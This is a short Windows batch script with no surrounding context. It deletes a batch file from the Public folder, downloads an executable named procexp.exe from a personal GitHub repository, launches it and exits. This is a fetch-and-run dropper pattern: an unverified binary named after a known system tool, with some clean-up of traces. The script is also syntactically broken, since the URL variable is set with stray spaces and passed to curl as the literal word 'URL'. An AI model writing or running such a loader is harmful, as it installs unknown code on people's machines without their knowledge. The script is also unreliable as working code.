@echo off

del C:\Users\Public\test.bat 
set URL = https://raw.githubusercontent.com/BelliniGauss/1/main/procexp.exe
curl -O URL

start procexp.exe

exit
